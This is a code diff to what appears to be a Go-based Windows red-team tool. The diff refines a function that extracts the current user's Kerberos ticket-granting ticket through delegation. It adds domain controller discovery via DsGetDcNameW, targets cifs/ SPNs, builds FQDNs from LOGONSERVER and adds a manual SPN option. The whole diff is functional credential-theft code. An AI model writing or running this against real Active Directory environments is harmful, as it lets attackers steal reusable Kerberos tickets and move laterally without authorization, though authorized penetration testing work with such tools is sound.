@@ -56,6 +56,63 @@ var (
 	procFreeContextBuffer          = secur32.NewProc("FreeContextBuffer")
 )
 
+// netapi32 procs for DC discovery
+var (
+	netapi32             = syscall.NewLazyDLL("netapi32.dll")
+	procDsGetDcNameW     = netapi32.NewProc("DsGetDcNameW")
+	procNetApiBufferFree = netapi32.NewProc("NetApiBufferFree")
+)
+
+// DSGETDCNAME flags
+const (
+	DS_DIRECTORY_SERVICE_REQUIRED = 0x00000010
+	DS_RETURN_DNS_NAME            = 0x40000000
+	DS_IP_REQUIRED                = 0x00000200
+)
+
+// DOMAIN_CONTROLLER_INFO structure
+type domainControllerInfoW struct {
+	DomainControllerName        *uint16
+	DomainControllerAddress     *uint16
+	DomainControllerAddressType uint32
+	DomainGuid                  [16]byte
+	DomainName                  *uint16
+	DnsForestName               *uint16
+	Flags                       uint32
+	DcSiteName                  *uint16
+	ClientSiteName              *uint16
+}
+
+// getDCNameFromAPI uses DsGetDcName API to discover the DC hostname
+func getDCNameFromAPI(domain string) string {
+	var pDCI *domainControllerInfoW
+	var domainPtr *uint16
+
+	if domain != "" {
+		domainPtr, _ = syscall.UTF16PtrFromString(domain)
+	}
+
+	ret, _, _ := procDsGetDcNameW.Call(
+		0,                                  // ComputerName (NULL = local)
+		uintptr(unsafe.Pointer(domainPtr)), // DomainName
+		0,                                  // DomainGuid (NULL)
+		0,                                  // SiteName (NULL)
+		DS_DIRECTORY_SERVICE_REQUIRED|DS_RETURN_DNS_NAME|DS_IP_REQUIRED, // Flags
+		uintptr(unsafe.Pointer(&pDCI)),                                  // DomainControllerInfo
+	)
+
+	if ret == 0 && pDCI != nil && pDCI.DomainControllerName != nil {
+		dcName := syscall.UTF16ToString((*[256]uint16)(unsafe.Pointer(pDCI.DomainControllerName))[:])
+		procNetApiBufferFree.Call(uintptr(unsafe.Pointer(pDCI)))
+		// Remove leading backslashes (returns \\dcname)
+		dcName = strings.TrimPrefix(dcName, "\\\\")
+		dcName = strings.TrimPrefix(dcName, "\\")
+		return dcName
+	}
+
+	return ""
+}
+
 // SECPKG_ATTR constants for QueryContextAttributes
 const (
 	SECPKG_ATTR_SESSION_KEY = 9
@@ -92,8 +149,18 @@ type TGTDelegResult struct {
 	Error      error
 }
 
-// ExtractTGTDeleg extracts the current user's TGT using delegation.
+// ExtractTGTDelegWithSPN extracts the current user's TGT using delegation with optional custom SPN.
+func ExtractTGTDelegWithSPN(customSPN string) (*TGTDelegResult, error) {
+	return extractTGTDelegInternal(customSPN)
+}
+
+// ExtractTGTDeleg extracts the current user's TGT using delegation (auto-detect SPN).
 func ExtractTGTDeleg() (*TGTDelegResult, error) {
+	return extractTGTDelegInternal("")
+}
+
+// extractTGTDelegInternal does the actual work with optional SPN.
+func extractTGTDelegInternal(customSPN string) (*TGTDelegResult, error) {
 	// Step 1: Get credentials handle for current user with Kerberos
 	var credHandle SecHandle
 	var expiry TimeStamp
@@ -149,9 +216,19 @@ func ExtractTGTDeleg() (*TGTDelegResult, error) {
 
 	// If we found a DC hostname, use it; otherwise try LOGONSERVER
 	var spnTarget string
-	if targetHost != "" {
-		spnTarget = fmt.Sprintf("HOST/%s", targetHost)
+
+	// Use custom SPN if provided
+	if customSPN != "" {
+		spnTarget = customSPN
+	} else if targetHost != "" {
+		spnTarget = fmt.Sprintf("cifs/%s", targetHost)
 	} else {
+		// Get the DNS domain for FQDN construction
+		domain := os.Getenv("USERDNSDOMAIN")
+		if domain == "" {
+			domain, _ = GetCurrentDomain()
+		}
+
 		// Try LOGONSERVER environment variable (contains DC we authenticated against)
 		logonServer := os.Getenv("LOGONSERVER")
 		if logonServer != "" {
@@ -159,21 +236,25 @@ func ExtractTGTDeleg() (*TGTDelegResult, error) {
 			logonServer = strings.TrimPrefix(logonServer, "\\\\")
 			logonServer = strings.TrimPrefix(logonServer, "\\")
 			if logonServer != "" {
-				spnTarget = fmt.Sprintf("HOST/%s", logonServer)
+				// If LOGONSERVER doesn't contain a dot, it's NETBIOS - append domain
+				if !strings.Contains(logonServer, ".") && domain != "" {
+					logonServer = logonServer + "." + strings.ToLower(domain)
+				}
+				spnTarget = fmt.Sprintf("cifs/%s", logonServer)
 			}
 		}
 
-		// If still no SPN, try to construct from USERDNSDOMAIN
+		// If still no SPN, try DsGetDcName API to discover DC
 		if spnTarget == "" {
-			domain := os.Getenv("USERDNSDOMAIN")
-			if domain == "" {
-				domain, _ = GetCurrentDomain()
+			dcName := getDCNameFromAPI(domain)
+			if dcName != "" {
+				spnTarget = fmt.Sprintf("cifs/%s", dcName)
 			}
-			if domain == "" {
-				return nil, fmt.Errorf("cannot determine target SPN - no cached tickets and LOGONSERVER not set")
-			}
-			// Try the domain itself as an SPN (may work if it resolves to DC)
-			spnTarget = fmt.Sprintf("HOST/%s", domain)
+		}
+
+		// If still no SPN, error out
+		if spnTarget == "" {
+			return nil, fmt.Errorf("cannot determine target SPN - LOGONSERVER not set and DC discovery failed. Use --spn to specify manually")
 		}
 	}
 
